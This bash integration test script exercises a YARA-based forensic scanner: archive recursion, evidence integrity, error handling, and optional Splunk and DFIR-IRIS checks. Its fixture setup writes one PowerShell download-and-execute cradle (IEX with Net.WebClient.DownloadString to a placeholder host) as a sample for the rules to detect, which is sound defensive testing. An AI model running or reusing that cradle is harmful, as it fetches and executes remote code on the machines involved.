#!/usr/bin/env bash
# End-to-end checks of a built yarax-scanner binary (Linux).
#
#   tests/integration_cli.sh [path/to/yarax-scanner]      default: dist/yarax-scanner
#
# Needs: bash, python3, zip, tar, gzip, sha256sum. Runs as any user; as root
# the permission check drops to uid 65534 with setpriv.
# Optional live checks, skipped unless set:
#   YARAX_SPLUNK_URL + YARAX_SPLUNK_TOKEN (+ YARAX_SPLUNK_INDEX)   Splunk HEC
#   YARAX_SPLUNK_INSECURE=1                                       self-signed HEC
#   YARAX_IRIS_URL + YARAX_IRIS_API_KEY + YARAX_IRIS_CASE          DFIR-IRIS (read-only)
set -uo pipefail
HERE=$(cd "$(dirname "$0")/.." && pwd)
S=$(realpath "${1:-$HERE/dist/yarax-scanner}")
[ -x "$S" ] || { echo "no scanner at $S (build it first: ./build-linux.sh)"; exit 2; }
W=$(mktemp -d)
trap 'chmod -R u+rwx "$W" 2>/dev/null; rm -rf "$W"' EXIT
pass=0; fail=0
check() {  # check "description" command...
  local d=$1; shift
  if "$@" >/dev/null 2>&1; then echo "PASS  $d"; pass=$((pass + 1)); else echo "FAIL  $d"; fail=$((fail + 1)); fi
}
rc() { "$@" >/dev/null 2>&1; echo $?; }
json() { python3 -c "import json,sys; d=json.load(open(sys.argv[1])); sys.exit(0 if ($2) else 1)" "$1"; }

echo "== scanner: $S"
"$S" --version

# ---- evidence fixture ------------------------------------------------------
E=$W/evidence; R=$W/rules; O=$W/out
mkdir -p "$E/sub dir" "$E/nested" "$R" "$O"
cp "$HERE/examples/rules/"*.yar "$R/"
cp "$HERE/examples/samples/"* "$E/"
printf 'IEX(New-Object Net.WebClient).DownloadString("http://x")\n' > "$E/sub dir/drop per.ps1"
printf 'nothing here\n' > "$E/plain.txt"
( cd "$E/nested" && cp ../malicious_sample.txt inner.txt && zip -q inner.zip inner.txt && rm inner.txt \
  && zip -q outer.zip inner.zip && rm inner.zip && tar czf logs.tar.gz -C .. plain.txt malicious_sample.txt \
  && gzip -c ../malicious_sample.txt > single.txt.gz )
hashes() { (cd "$E" && find . -type f -exec sha256sum {} + | sort; find . -printf '%p %T@ %s\n' | sort); }
hashes > "$W/before"

# ---- basic scan ------------------------------------------------------------
echo "== scan"
"$S" --path "$E" --rules "$R" --output "$O/r.json" --quiet; code=$?
check "scan exits 0" test "$code" = 0
check "report is valid JSON with scan_information" json "$O/r.json" "'scan_information' in d"
check "malicious sample matched" json "$O/r.json" "any(h['file'].endswith('/malicious_sample.txt') for h in d['hits'])"
check "file in a folder with spaces matched" json "$O/r.json" "any('sub dir/drop per.ps1' in h['file'] for h in d['hits'])"
check "clean files not matched" json "$O/r.json" "not any(h['file'].endswith(('clean_sample.txt','/plain.txt')) for h in d['hits'])"
check "hit inside nested zip (outer.zip::inner.zip::inner.txt)" json "$O/r.json" "any(h['file'].endswith('outer.zip::inner.zip::inner.txt') for h in d['hits'])"
check "hit inside tar.gz" json "$O/r.json" "any('logs.tar.gz::malicious_sample.txt' in h['file'] for h in d['hits'])"
check "hit inside single .gz" json "$O/r.json" "any(h['file'].endswith('single.txt.gz::single.txt') for h in d['hits'])"
check "disk hits carry sha256 of the file" json "$O/r.json" "all(len(h['sha256'])==64 for h in d['hits'] if '::' not in h['file'])"
sha=$(sha256sum "$E/malicious_sample.txt" | cut -d' ' -f1)
check "sha256 in the report is the file's real hash" json "$O/r.json" "any(h['sha256']=='$sha' for h in d['hits'] if h['file'].endswith('/malicious_sample.txt'))"
check "event stream written, last event is the summary" python3 -c "import json; l=[json.loads(x) for x in open('$O/r.events.ndjson')]; assert l[-1]['event_type']=='scan_summary' and l[-1]['scan_status']=='completed'"
check "rule_definition events carry the exact rule text" python3 -c "import json; l=[json.loads(x) for x in open('$O/r.events.ndjson')]; assert all(e['yara_rule_text_status']=='exact' for e in l if e['event_type']=='rule_definition')"
check "no unreadable list when nothing was unreadable" test ! -e "$O/r.unreadable.tsv"
check "positional form PATH RULES works" test "$(rc "$S" "$E" "$R" --output "$O/p.json" --quiet)" = 0

# ---- evidence integrity ----------------------------------------------------
hashes > "$W/after"
check "evidence unchanged (content hashes, mtimes, sizes)" cmp -s "$W/before" "$W/after"

# ---- usage errors (exit 2, nothing scanned) --------------------------------
echo "== usage errors"
check "missing scan path: exit 2" test "$(rc "$S" --path "$W/nope" --rules "$R" --output "$O/m.json")" = 2
check "missing scan path: no report written" test ! -e "$O/m.json"
check "missing rules: exit 2" test "$(rc "$S" --path "$E" --rules "$W/nope" --output "$O/m2.json")" = 2
check "extra positional argument: exit 2" test "$(rc "$S" "$E" "$R" "$W/stray" --output "$O/m3.json")" = 2
check "--splunk-url without token: exit 2" test "$(env -u YARAX_SPLUNK_TOKEN "$S" --path "$E" --rules "$R" --output "$O/m4.json" --splunk-url https://x:8088 >/dev/null 2>&1; echo $?)" = 2
check "bad --external: exit 2" test "$(rc "$S" --path "$E" --rules "$R" --output "$O/m5.json" --external novalue)" = 2

# ---- rule checking -----------------------------------------------------------
echo "== rules"
B=$W/badrules; mkdir -p "$B"; cp "$R"/*.yar "$B/"
printf 'rule broken { condition: nope }\n' > "$B/broken.yar"
check "--check-rules on good rules: exit 0" test "$(rc "$S" --check-rules --rules "$R")" = 0
check "--check-rules lists the broken file: exit 1" bash -c "'$S' --check-rules --rules '$B' | grep -q 'FAIL.*broken.yar'; test \${PIPESTATUS[0]} = 1"
check "scan with a broken rule file: exit 2" test "$(rc "$S" --path "$E" --rules "$B" --output "$O/b.json")" = 2
check "failed scan still records a failed summary event" python3 -c "import json; l=[json.loads(x) for x in open('$O/b.events.ndjson')]; assert l[-1]['scan_status']=='failed'"
"$S" --path "$E" --rules "$B" --output "$O/s.json" --skip-invalid-rules --quiet 2>"$W/skip.err"; code=$?
check "--skip-invalid-rules scans with the rest: exit 0" test "$code" = 0
check "--skip-invalid-rules warns about the skipped file" grep -q 'skipping invalid rule file.*broken.yar' "$W/skip.err"
check "--skip-invalid-rules still finds the hit" json "$O/s.json" "len(d['hits'])>0"

# ---- report next to / inside the evidence ------------------------------------
echo "== report inside the scanned folder"
cp -r "$E" "$W/ev2"
"$S" --path "$W/ev2" --rules "$R" --output "$W/ev2/report.json" --quiet; code=$?
"$S" --path "$W/ev2" --rules "$R" --output "$W/ev2/report.json" --quiet; code2=$?
check "rescan with the report inside the target: exit 0" test "$code$code2" = 00
check "the scanner never scans its own report/event files" json "$W/ev2/report.json" "not any('report.' in h['file'] for h in d['hits'])"
check "...and counts only the evidence files" python3 -c "
import json; a=json.load(open('$O/r.json'))['scan_information']; b=json.load(open('$W/ev2/report.json'))['scan_information']
assert a['files_scanned']==b['files_scanned'], (a['files_scanned'], b['files_scanned'])"

# ---- unreadable items --------------------------------------------------------
echo "== unreadable items"
U=$W/unreadable; mkdir -p "$U/locked"; cp "$E/malicious_sample.txt" "$U/"; echo secret > "$U/locked/x.txt"
cp "$E/malicious_sample.txt" "$U/noperm.txt"
( cd "$U" && cp malicious_sample.txt secret.txt && cp malicious_sample.txt open.txt \
  && zip -q -P pw enc.zip secret.txt && zip -q enc.zip open.txt && rm secret.txt open.txt )
chmod 000 "$U/locked" "$U/noperm.txt"; chmod 777 "$O"; chmod o+rx "$W" "$R"; chmod o+r "$R"/*
as_user=(); [ "$(id -u)" = 0 ] && as_user=(setpriv --reuid=65534 --regid=65534 --clear-groups)
"${as_user[@]}" "$S" --path "$U" --rules "$R" --output "$O/u.json" --quiet; code=$?
check "unreadable items: exit 1 (completed with errors)" test "$code" = 1
check "unreadable list names the locked folder (dir)" grep -qP '^dir\t.*/locked\t' "$O/u.unreadable.tsv"
check "unreadable list names the unreadable file (open)" grep -qP '^open\t.*/noperm.txt\t' "$O/u.unreadable.tsv"
check "unreadable list names the encrypted zip member (member)" grep -qP '^member\t.*/enc.zip::#\d+\t' "$O/u.unreadable.tsv"
check "unencrypted member of the same zip still matched" json "$O/u.json" "any(h['file'].endswith('enc.zip::open.txt') for h in d['hits'])"
check "readable file next to them still matched" json "$O/u.json" "any(h['file'].endswith('/malicious_sample.txt') for h in d['hits'])"
check "summary event says completed_with_errors" python3 -c "import json; l=[json.loads(x) for x in open('$O/u.events.ndjson')]; assert l[-1]['scan_status']=='completed_with_errors'"
chmod 755 "$U/locked"; chmod 644 "$U/noperm.txt"

# ---- interrupted scan --------------------------------------------------------
echo "== interrupted scan"
I=$W/big; mkdir -p "$I"
python3 -c "
import os
for i in range(400):
    open(os.path.join('$I', f'f{i}.bin'), 'wb').write(os.urandom(256*1024))"
"$S" --path "$I" --rules "$R" --output "$O/i.json" --threads 1 --hash-all --quiet & pid=$!
sleep 0.3; kill -9 $pid 2>/dev/null; wait $pid 2>/dev/null
check "killed scan leaves its event spool on disk" test -s "$O/i.events.ndjson"
check "every spool line of a killed scan is complete JSON" python3 -c "import json; [json.loads(x) for x in open('$O/i.events.ndjson')]"

# ---- Splunk (live, optional) -------------------------------------------------
if [ -n "${YARAX_SPLUNK_URL:-}" ] && [ -n "${YARAX_SPLUNK_TOKEN:-}" ]; then
  echo "== Splunk HEC (live)"
  sp=(--splunk-url "$YARAX_SPLUNK_URL"); [ -n "${YARAX_SPLUNK_INDEX:-}" ] && sp+=(--splunk-index "$YARAX_SPLUNK_INDEX")
  [ "${YARAX_SPLUNK_INSECURE:-}" = 1 ] && sp+=(--splunk-insecure)
  check "--splunk-test: exit 0" test "$(rc "$S" --splunk-test "${sp[@]}")" = 0
  "$S" --path "$E" --rules "$R" --output "$O/sp.json" --target-host E2E-TEST --quiet "${sp[@]}" 2>"$W/sp.err"; code=$?
  check "scan with Splunk delivery: exit 0" test "$code" = 0
  check "delivery state: delivered, every event sent" python3 -c "
import json; d=json.load(open('$O/sp.events.delivery.json')); n=sum(1 for _ in open('$O/sp.events.ndjson'))
assert d['delivery_status']=='delivered' and d['events_sent']==n, d"
  check "token never written to disk" bash -c "! grep -rqF -- \"\$YARAX_SPLUNK_TOKEN\" '$O'"
  check "wrong token is refused, not retried: exit 1" test "$(YARAX_SPLUNK_TOKEN=00000000-0000-0000-0000-000000000000 "$S" --splunk-send "$O/r.events.ndjson" "${sp[@]}" >/dev/null 2>&1; echo $?)" = 1
  grep -h SPLUNK "$W/sp.err"
else
  echo "SKIP  Splunk HEC (set YARAX_SPLUNK_URL and YARAX_SPLUNK_TOKEN)"
fi

# ---- DFIR-IRIS (live, optional, read-only) -----------------------------------
if [ -n "${YARAX_IRIS_URL:-}" ] && [ -n "${YARAX_IRIS_API_KEY:-}" ] && [ -n "${YARAX_IRIS_CASE:-}" ]; then
  echo "== DFIR-IRIS (live, read-only)"
  ir=(--iris-url "$YARAX_IRIS_URL" --iris-insecure)
  export XDG_CONFIG_HOME=$W/config      # never read or write the user's saved IRIS settings
  check "--iris-list shows the case" bash -c "'$S' ${ir[*]} --iris-list | grep -qE '^ +$YARAX_IRIS_CASE '"
  check "--iris-list --iris-case lists its IOCs" bash -c "'$S' ${ir[*]} --iris-list --iris-case $YARAX_IRIS_CASE | grep -q 'IOCs)'"
  "$S" "${ir[@]}" --iris-case "$YARAX_IRIS_CASE" --iris-export "$W/iris" >"$W/iris.out" 2>"$W/iris.err"; code=$?
  check "--iris-export writes a bundle: exit 0" test "$code" = 0
  check "bundle is named after the case" bash -c "ls '$W/iris' | grep -qE '^IRIS_case${YARAX_IRIS_CASE}_.*\.yar$'"
  check "bundle compiles (--check-rules)" test "$(rc "$S" --check-rules --rules "$W/iris")" = 0
  check "a wrong API key is refused: exit 1" test "$(YARAX_IRIS_API_KEY=wrong "$S" "${ir[@]}" --iris-list >/dev/null 2>&1; echo $?)" = 1
  "$S" "${ir[@]}" --iris-list --iris-case "$YARAX_IRIS_CASE" > "$W/iocs.txt"
  # snapshot() directly: the script itself prompts for the key and has its URL built in
  python3 -c 'import os, sys; sys.path.insert(0, sys.argv[1]); import iris_snapshot as s
s.snapshot(os.environ["YARAX_IRIS_URL"], os.environ["YARAX_IRIS_API_KEY"], sys.argv[2], insecure=True)' \
    "$HERE/tools" "$W/snap.json" >/dev/null
  check "snapshot file stands in for the API (same IOC list, no key)" bash -c \
    "diff <(YARAX_IRIS_API_KEY= '$S' --iris-url '$W/snap.json' --iris-list --iris-case $YARAX_IRIS_CASE 2>/dev/null) '$W/iocs.txt'"
  cat "$W/iris.out"; sed 's/^/  /' "$W/iris.err"
else
  echo "SKIP  DFIR-IRIS (set YARAX_IRIS_URL, YARAX_IRIS_API_KEY and YARAX_IRIS_CASE)"
fi

echo
echo "passed $pass, failed $fail"
[ "$fail" = 0 ]
